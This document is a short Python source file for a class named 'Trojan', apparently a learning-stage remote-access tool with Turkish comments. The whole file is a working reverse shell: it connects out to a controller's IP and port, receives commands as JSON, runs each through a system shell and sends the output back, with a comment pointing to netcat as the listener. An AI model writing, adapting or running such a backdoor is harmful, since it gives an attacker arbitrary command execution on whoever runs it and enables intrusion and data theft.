import socket
import subprocess
import simplejson as json


class Trojan:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM TCP dir
        self.link.connect((ip, port))  # nc -l -p 888 ile dinleyebilirsin

    def command_process(self, command):
        return subprocess.check_output(command, shell=True)

    def packeting(self, data):
        packet = json.dumps(data)
        self.link.send(packet)

    def packet_decode(self):
        incoming_data = ""
        while True:
            try:
                incoming_data = self.link.recv(1024).decode("utf-8")
                return json.loads(incoming_data)
            except ValueError:
                continue

    def start(self):
        while True:
            command = self.packet_decode()
            data = self.command_process(command)
            self.packeting(data)

        self.link.close()


trojan = Trojan(ip="127.0.0.1", port=8080)
trojan.start()
